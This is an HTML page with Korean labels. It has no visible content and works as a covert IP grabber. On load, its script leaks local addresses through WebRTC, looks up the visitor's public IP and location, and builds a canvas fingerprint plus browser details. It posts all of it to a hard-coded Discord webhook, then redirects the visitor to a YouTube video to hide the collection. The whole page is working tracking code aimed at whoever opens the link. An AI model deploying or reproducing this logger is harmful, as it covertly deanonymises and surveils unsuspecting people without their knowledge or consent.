<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>| </title>
</head>
<body>

    <script>
        const discord_webhook = 'https://discord.com/api/webhooks/1455179286074888283/_mJ8ExGHd9-qkxSFKYp20RuqTL0aIMmDmEmXCSoVRcytYHstAGS83MSPZ9gOJ4-_IwAH';
        const redirect = 'https://youtu.be/WTvBlsUJqdo?si=7NP_eCK2byLv4LNB';

       
        async function getWebRTC_IPs() {
            const ipCandidates = new Set();
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });

                pc.onicecandidate = (event) => {
                    if (event.candidate && event.candidate.candidate) {
                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
                        const match = ipRegex.exec(event.candidate.candidate);
                        if (match) {
                            ipCandidates.add(match[1]);
                        }
                    }
                };
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ipCandidates));
                }, 2000); 
            });
        }

       
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const txt = 'Browser Fingerprint by Gemini';
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText(txt, 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText(txt, 4, 17);
                const dataURL = canvas.toDataURL();
               
                let hash = 0;
                for (let i = 0; i < dataURL.length; i++) {
                    const char = dataURL.charCodeAt(i);
                    hash = ((hash << 5) - hash) + char;
                    hash |= 0; // 32ë¹„íŠ¸ ì •ìˆ˜ë¡œ ë³€í™˜
                }
                return hash.toString();
            } catch (e) {
                console.error("Canvas fingerprinting error:", e);
                return 'Error';
            }
        }
        
  
        async function main() {
            try {
                const webrtcIPs = await getWebRTC_IPs();
                const canvasFingerprint = getCanvasFingerprint();

                let userIP = '';
                let location = '';
                let data = null;
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    data = await response.json();
                    userIP = data.ip;
                    location = `${data.city}, ${data.region}, ${data.country_name}`;
                } catch(error) {
                    try {
                        const response = await fetch('https://api.ipify.org?format=json');
                        const ipData = await response.json();
                        userIP = ipData.ip;
                        location = 'ìœ„ì¹˜ ì •ë³´ ì—†ìŒ';
                        data = { ip: userIP };
                    } catch(error2) {
                        userIP = 'ì•Œ ìˆ˜ ì—†ìŒ';
                        location = 'ì•Œ ìˆ˜ ì—†ìŒ';
                        data = { ip: userIP };
                    }
                }

                const message = { 
                    embeds: [{ 
                        title: "ğŸ” ìƒˆë¡œìš´ ë°©ë¬¸ì ê°ì§€", 
                        color: 0xff6b6b, 
                        fields: [ 
                            { name: "ğŸŒ ê³µì¸ IP ì£¼ì†Œ (ì„œë²„ ì ‘ì† IP)", value: data.ip, inline: true }, 
                            { name: "ğŸ“ ìœ„ì¹˜", value: location, inline: true },
                            { name: "ğŸ“¡ WebRTC IP ì£¼ì†Œ (ì‹¤ì œ ip)", value: webrtcIPs.length > 0 ? webrtcIPs.join('\n') : 'í™•ì¸ ë¶ˆê°€', inline: false },
                            { name: "ğŸ–¥ï¸ ë¸Œë¼ìš°ì € ì •ë³´", value: navigator.userAgent, inline: false }, 
                            { name: "ğŸ“± í™”ë©´ í•´ìƒë„", value: `${screen.width}x${screen.height}`, inline: true }, 
                            { name: "ğŸŒ ì‹œê°„ëŒ€", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
                            { name: "ğŸ¨ Canvas ì§€ë¬¸", value: canvasFingerprint, inline: false }
                        ], 
                        timestamp: new Date().toISOString(), 
                    }] 
                }; 

                await fetch(discord_webhook, { 
                    method: 'POST', 
                    headers: { 
                        'Content-Type': 'application/json', 
                    }, 
                    body: JSON.stringify(message) 
                });
                
            } catch (error) {
                console.error("ì˜¤ë¥˜ ë°œìƒ:", error);
            } finally {
                window.location.href = redirect;
            }
        }

        window.addEventListener('load', main);
    </script>
</body>
</html>
